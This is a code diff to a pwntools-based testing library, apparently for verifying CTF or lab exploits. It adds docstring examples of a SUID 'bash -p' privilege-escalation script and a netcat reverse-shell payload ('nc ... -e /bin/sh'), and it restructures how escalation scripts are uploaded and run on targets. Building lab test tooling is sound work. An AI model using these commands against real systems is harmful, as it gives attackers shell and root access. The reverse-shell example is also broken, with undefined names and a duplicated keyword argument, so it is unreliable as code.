@@ -23,7 +23,6 @@ class PwnTest:
     """
     PwnTest is the main class for pwntest. It initialises the other pwntest modules.
     """
-    log: pwnlib.log.Logger = pwnlib.log.getLogger("pwntest")
 
     def __init__(self, remote_target: str = "", port: int = 0, binary_path: str = "", ssh: dict = None) -> None:
         """
@@ -41,6 +40,7 @@ class PwnTest:
         self.remote_ip: str = remote_target
         self.remote_port: int = port
         tempfile.template = "/tmp/pwntest_"
+        self.log: pwnlib.log.Logger = pwnlib.log.getLogger("pwntest")
 
         configure_logger()
         self.log.setLevel("DEBUG")
@@ -74,10 +74,20 @@ class PwnTest:
         Asserts that a priv esc script can be used to escalate privileges on a host. Works with most of the pwnlib tubes.
         The priv esc script must be executable on the target machine. e.g a shell script, or elf that drops a shell etc.
 
-        :param user: The elevated user
-        :param conn: A pwnlib.tubes.[process|sock|ssh] tube.
-        :param priv_script: Path to the priv esc script on the local machine.
+        :param user: The elevated user to priv esc to.
+        :param conn: A pwnlib.tubes.[process, sock, ssh] tube.
+        :param priv_script: Path to the priv esc script on the local machine. Does not need to be a particular file type, but must be able to run on the target machine.
         :return: True if the priv esc script worked, False otherwise.
+
+        :Example:
+
+        >>> with open("/tmp/priv.sh", "wt") as f:
+        >>>     f.write("bash -p\\n") # if bash on the target is SUID
+        >>> assert tester.assert_priv_esc("root", "/tmp/priv.sh", tester.SSHAutomation.ssh)
+        True
+
+
+
         """
         proc = None
         if not os.path.exists(priv_script):
@@ -88,9 +98,7 @@ class PwnTest:
 
         # don't really need to do anything for this one, but check its executable
         if isinstance(conn, pwnlib.tubes.process.process):
-            if not os.access(priv_script, os.X_OK):
-                self.log.error("Priv esc file is not executable")
-                return False
+            pass
 
         # upload the priv esc script to the remote host using the pwnlib.ssh module
         elif isinstance(conn, pwnlib.tubes.ssh.ssh):
@@ -103,9 +111,11 @@ class PwnTest:
                 return False
 
             conn.upload(priv_script, f"/tmp/{file_name}")
-            self.SSHAutomation.assert_file_exists(f"/tmp/{file_name}")
+            if not self.SSHAutomation.assert_file_exists(f"/tmp/{file_name}"):
+                self.log.warning("Failed to upload priv esc script. Skipping priv esc test.")
+                return False
+
             proc = conn.run(b"sh")
-            proc.sendline(f"chmod +x /tmp/{file_name}".encode())
 
         # upload the file by encoding it in base64 and decoding it on the remote host
         # TODO: Test this works for huge files
@@ -115,12 +125,11 @@ class PwnTest:
                 encoded_data = base64.b64encode(data)
                 conn.sendline(b"echo -ne '" + encoded_data + f"' | base64 -d > /tmp/{file_name}".encode())
                 proc = conn
-                proc.sendline(f"chmod +x /tmp/{file_name}".encode())
-
         else:
             self.log.error("Unsupported connection type")
             return False
 
+        proc.sendline(f"chmod +x /tmp/{file_name}".encode())
         proc.sendline(f"/tmp/{file_name}".encode())
         proc.clean(timeout=1)
         proc.sendline(b"id")
@@ -142,8 +151,26 @@ class PwnTest:
         :param local_host: The local interface to listen on
         :param local_port: The local port to listen on
         :param exploit_function: A Python function object. Must take arguments `local_host`, `local_port`, and any `**kwargs`
+        :param kwargs: Any additional arguments to pass through to the exploit function
         :return: A pwnlib.tubes.listen.listen object if a connection was made, None otherwise
+
+        :Example:
+
+        .. code-block:: python
+
+            def exploit(rhost, rport, lhost, lport):
+                send_payload(f"nc {remote_host} {rport} -e /bin/sh")
+
+            shell = tester.run_reverse_shell_exploit(lhost, lport,
+                                                exploit_function=exploit_code,
+                                                rhost=rhost,
+                                                rhost=rport,
+                                                lhost=lhost,
+                                                lport=lport)
+            shell.interactive()
+
         """
+
         socket_details: dict = {}
 
         # create a listener thread
@@ -175,11 +202,11 @@ class PwnTest:
 
         return conn
 
-    @classmethod
-    def run_socket_listener(cls, listener_host: str, listener_port: int, socket_details: dict, timeout: float = 5.0) -> None:
+    def run_socket_listener(self, listener_host: str, listener_port: int, socket_details: dict, timeout: float = 5.0) -> None:
         """
         Listens for a connection on a given host and port. If a connection is made, the socket details are stored in the
-        socket_details dictionary.
+        socket_details dictionary. This routine was designed to be used by the ``run_reverse_shell_exploit`` method,
+        but can be used independently as well.
 
         :param listener_host: The local interface to listen on
         :param listener_port: The local port to listen on
@@ -190,14 +217,14 @@ class PwnTest:
 
         # begin with raw sockets, as the pwnlib.remote implementation
         # blocks the thread until a connection is made
-        with cls.log.progress("Waiting for connection") as progress:
+        with self.log.progress("Waiting for connection") as progress:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             sock.settimeout(timeout)
             try:
                 sock.bind((listener_host, listener_port))
             except socket.error as error:
-                cls.log.warning("Failed due to %s", error)
+                self.log.warning("Failed due to %s", error)
                 return
 
             try:
@@ -226,40 +253,6 @@ class PwnTest:
         """
         tube.sendline(b"echo FOOBAR")
         return tube.connected()
-
-    def assert_flag(self, tube, flag_path: str, flag_str: str) -> bool:
-        """
-        Checks if a flag is accessible to a pwntools tube object [ssh, socket, process]
-
-        :param tube: A pwntools tube object [ssh, socket, process]
-        :param flag_path: The path to the flag file
-        :param flag_str: The expected flag string
-        :return: True if the flag is readable and correct, False otherwise
-        """
-        if isinstance(tube, pwnlib.tubes.ssh.ssh):
-            if not tube.connected():
-                self.log.warning("SSH connection is not open")
-                return False
-            shell = tube.run("sh")
-        elif isinstance(tube, pwnlib.tubes.sock.sock or pwnlib.tubes.remote.remote):
-            # the socket connected doesn't update until it fails, so check
-            tube.send("echo A")
-            if not tube.connected():
-                self.log.warning("Socket connection is not open")
-                return False
-            shell = tube
-        elif isinstance(tube, pwnlib.tubes.process.process):
-            if not tube.connected():
-                self.log.warning("Process connection is not open")
-                return False
-            shell = tube
-        else:
-            self.log.warning("Unsupported connection type")
-            return False
-
-        shell.clean()
-        shell.sendline(f"cat {flag_path}".encode())
-        return flag_str in shell.readrepeat(timeout=1).decode()
 
 
 class SSHAutomation:
